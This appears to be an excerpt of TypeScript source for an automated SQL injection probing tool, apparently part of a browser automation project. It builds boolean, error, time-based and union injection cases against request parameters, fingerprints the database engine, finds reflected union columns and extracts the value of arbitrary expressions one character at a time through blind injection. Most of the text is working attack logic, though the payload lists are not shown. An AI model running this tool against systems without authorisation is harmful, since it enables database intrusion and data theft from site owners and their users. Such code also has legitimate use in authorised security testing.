...
import type { FetchStep, ReplayRequest, SqliProbeOptions } from "../shared/types.js";
...
function buildSqliProbeCases(normalized: NormalizedSqliProbeOptions): { cases: SqliProbeCase[]; totalCaseCount: number } {
	const cases: SqliProbeCase[] = [];
	let totalCaseCount = 0;
	const add = (item: SqliProbeCase) => {
		totalCaseCount += 1;
		if (cases.length < normalized.maxCases) cases.push(item);
	};
	const payloadGroups = [
		{ kind: "error", payloads: normalized.errorPayloads },
		{ kind: "time", payloads: normalized.timePayloads },
		{ kind: "union", payloads: normalized.unionPayloads },
	];
	for (const location of normalized.locations) {
		for (const paramName of normalized.paramNames) {
			if (normalized.probeTypes.includes("boolean")) {
				for (const pair of normalized.booleanPairs) add({ kind: "boolean", name: pair.name, location, paramName, truePayload: pair.truePayload, falsePayload: pair.falsePayload });
			}
			for (const group of payloadGroups) if (normalized.probeTypes.includes(group.kind)) {
				for (const payload of group.payloads) add({ kind: group.kind, name: payload, location, paramName, payload });
			}
		}
	}
	return { cases, totalCaseCount };
}

async function establishSqliProbeBaseline(baseRequest: ReplayRequest, normalized: NormalizedSqliProbeOptions) {
	const responses: Array<Record<string, unknown>> = [];
	let final: FetchStep | undefined;
	for (let i = 0; i < normalized.baselineRepeats; i += 1) {
		const sent = await sendReplayLikeRequest(baseRequest, normalized);
		final = sent.exchange.final;
		responses.push(sqliResponseRecord(final, sent.exchange));
	}
	if (!final) throw createCodedError({ name: "SqliProbeRuntimeError", code: "TIMEOUT", message: "browser_sqli_probe could not establish baseline response", details: { phase: "baseline" }, suppressStack: false });
	return { responses, final, fingerprint: responseFingerprint(final), sqlError: hasSqlError(final.bodyText), dbms: detectSqlDbms(final.bodyText) };
}

function createSqliProbeRunState(options: SqliProbeOptions, baseRequest: ReplayRequest, normalized: NormalizedSqliProbeOptions, baseline: Awaited<ReturnType<typeof establishSqliProbeBaseline>>, plan: ReturnType<typeof buildSqliProbeCases>) {
	return {
		options, baseRequest, normalized, baseline, cases: plan.cases, totalCaseCount: plan.totalCaseCount,
		results: [] as Array<Record<string, unknown>>, matched: [] as Array<Record<string, unknown>>, failures: [] as Array<Record<string, unknown>>,
		echoPositions: [] as Array<Record<string, unknown>>, extractions: [] as Array<Record<string, unknown>>, shortCircuitedTargets: new Set<string>(), requestCount: 0, extraCaseCount: 0,
	};
}

type SqliProbeRunState = ReturnType<typeof createSqliProbeRunState>;

async function replaySqliPayload(state: SqliProbeRunState, location: string, paramName: string, payload: string) {
	const value = sqliPayloadValue(state.baseRequest, location, paramName, payload, state.normalized.payloadMode);
	const request = mutateParamRequest(state.baseRequest, location, paramName, value);
	const replay = await sendReplayLikeRequest(request, state.normalized);
	state.requestCount += 1;
	return replay;
}

function recordSqliEvidence(state: SqliProbeRunState, evidence: Record<string, unknown>, targetKey?: string): void {
	state.results.push(evidence);
	if (evidence.matched !== true) return;
	state.matched.push(evidence);
	if (targetKey && state.normalized.stopOnFirstMatch) state.shortCircuitedTargets.add(targetKey);
}

function recordSqliFailure(state: SqliProbeRunState, details: Record<string, unknown>, error: unknown): void {
	state.failures.push({ ...details, error: error instanceof Error ? error.message : String(error) });
}

async function runInitialSqliProbeCases(state: SqliProbeRunState): Promise<void> {
	for (const item of state.cases) {
		const targetKey = `${item.location}:${item.paramName}`;
		if (state.normalized.stopOnFirstMatch && state.shortCircuitedTargets.has(targetKey)) continue;
		try {
			if (item.kind === "boolean") {
				const trueReplay = await replaySqliPayload(state, item.location, item.paramName, item.truePayload || "");
				if (state.normalized.delayMs > 0) await sleep(state.normalized.delayMs);
				const falseReplay = await replaySqliPayload(state, item.location, item.paramName, item.falsePayload || "");
				const trueFp = responseFingerprint(trueReplay.exchange.final);
				const falseFp = responseFingerprint(falseReplay.exchange.final);
				const evidence = { type: "boolean", matched: responsesDiffer(trueFp, falseFp), location: item.location, paramName: item.paramName, payloads: { truePayload: item.truePayload, falsePayload: item.falsePayload }, baselineAffinity: { trueDistance: responseDistance(state.baseline.fingerprint, trueFp), falseDistance: responseDistance(state.baseline.fingerprint, falseFp) }, trueResponse: sqliResponseRecord(trueReplay.exchange.final, trueReplay.exchange), falseResponse: sqliResponseRecord(falseReplay.exchange.final, falseReplay.exchange) };
				recordSqliEvidence(state, evidence, targetKey);
			} else {
				const replay = await replaySqliPayload(state, item.location, item.paramName, item.payload || "");
				...
				const elapsedDeltaMs = final.elapsedMs - state.baseline.final.elapsedMs;
				const matched = item.kind === "error" ? bodyHasSqlError && !state.baseline.sqlError : item.kind === "time" ? elapsedDeltaMs >= state.normalized.timeThresholdMs : responsesDiffer(state.baseline.fingerprint, fp);
				recordSqliEvidence(state, { type: item.kind, matched, location: item.location, paramName: item.paramName, payload: item.payload, ...sqliUnionMeta(item.payload || ""), elapsedDeltaMs, sqlError: bodyHasSqlError, dbms, baselineDistance: responseDistance(state.baseline.fingerprint, fp), response: sqliResponseRecord(final, replay.exchange) }, targetKey);
			}
		} catch (error) {
			recordSqliFailure(state, { type: item.kind, location: item.location, paramName: item.paramName, payload: item.payload, truePayload: item.truePayload, falsePayload: item.falsePayload }, error);
		}
		if (state.normalized.delayMs > 0 && state.requestCount > 0) await sleep(state.normalized.delayMs);
	}
}

async function runSqliUnionEcho(state: SqliProbeRunState): Promise<void> {
	if (state.normalized.probeTypes.includes("union") && state.options.unionEcho !== false && !state.normalized.stopOnFirstMatch) {
		const columnHints = inferSqliColumnHints(state.results);
		for (const hint of columnHints) {
			...
			for (let position = 1; position <= columnCount && state.cases.length + state.extraCaseCount < state.normalized.maxCases; position += 1) {
				const marker = `browser_pilot_sql_echo_${position}_${randomUUID().replace(/-/g, "").slice(0, 8)}`;
				const payload = unionEchoPayload(columnCount, position, marker);
				try {
					const replay = await replaySqliPayload(state, String(hint.location), String(hint.paramName), payload);
					state.extraCaseCount += 1;
					const final = replay.exchange.final;
					...
					recordSqliEvidence(state, evidence);
					if (reflected) {
						state.echoPositions.push({ location: hint.location, paramName: hint.paramName, columnCount, position, marker });
					}
				} catch (error) {
					recordSqliFailure(state, { type: "union-echo", location: hint.location, paramName: hint.paramName, columnCount, position }, error);
				}
				if (state.normalized.delayMs > 0) await sleep(state.normalized.delayMs);
			}
		}
...
async function runSqliBlindExtraction(state: SqliProbeRunState): Promise<void> {
	const extractExpression = asString(state.options.extractExpression)?.trim();
	const oracle = extractExpression ? firstBooleanOracle(state.results) : undefined;
	if (extractExpression && oracle && state.cases.length + state.extraCaseCount < state.normalized.maxCases) {
		const charset = asString(state.options.extractCharset) || "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-@.:/ ";
		const maxLength = Math.min(256, positiveInt(state.options.extractMaxLength, 32));
		const dbms = state.normalized.requestedDbms[0] || undefined;
		let value = "";
		let complete = false;
		let attempts = 0;
		for (let position = 1; position <= maxLength && state.cases.length + state.extraCaseCount < state.normalized.maxCases; position += 1) {
			let found = "";
			for (const char of Array.from(charset)) {
				if (state.cases.length + state.extraCaseCount >= state.normalized.maxCases) break;
				const payload = blindAsciiPayload(dbms, extractExpression, position, char.charCodeAt(0));
				try {
					const replay = await replaySqliPayload(state, oracle.location, oracle.paramName, payload);
					state.extraCaseCount += 1;
					attempts += 1;
					...
					recordSqliFailure(state, { type: "blind-extract", location: oracle.location, paramName: oracle.paramName, position, char }, error);
				}
				if (state.normalized.delayMs > 0) await sleep(state.normalized.delayMs);
			}
			if (!found) {
		...
		state.extractions.push({ location: oracle.location, paramName: oracle.paramName, expression: extractExpression, value, length: value.length, attempts, complete, dbms: dbms || "generic" });
	}
}
...
export async function runSqliProbe(options: SqliProbeOptions) {
	...
	const plan = buildSqliProbeCases(normalized);
	const baseline = await establishSqliProbeBaseline(baseRequest, normalized);
	const state = createSqliProbeRunState(options, baseRequest, normalized, baseline, plan);
	await runInitialSqliProbeCases(state);
	await runSqliUnionEcho(state);
	await runSqliBlindExtraction(state);
	const oracleTypes = [...new Set(state.matched.map((item) => String(item.type || "unknown")))];
	const dbmsFingerprints = [...new Set([...normalized.requestedDbms, ...state.baseline.dbms, ...state.results.flatMap((item) => Array.isArray(item.dbms) ? item.dbms.map(String) : [])])];
	return { ok: state.failures.length === 0, generatedAt: new Date().toISOString(), baseline: state.baseline.responses[state.baseline.responses.length - 1], baselineRepeats: normalized.baselineRepeats, locationCount: normalized.locations.length, paramCount: normalized.paramNames.length, probeTypes: normalized.probeTypes, payloadMode: normalized.payloadMode, dbmsPayloadPack: normalized.requestedDbms, caseCount: state.cases.length + state.extraCaseCount, requestCount: state.requestCount, matchedCount: state.matched.length, oracleTypes, dbmsFingerprints, columnHints: inferSqliColumnHints(state.results), echoPositions: state.echoPositions, extractions: state.extractions, truncatedCases: Math.max(0, state.totalCaseCount - state.cases.length), timeThresholdMs: normalized.timeThresholdMs, results: state.results, matched: state.matched, failures: state.failures };
}
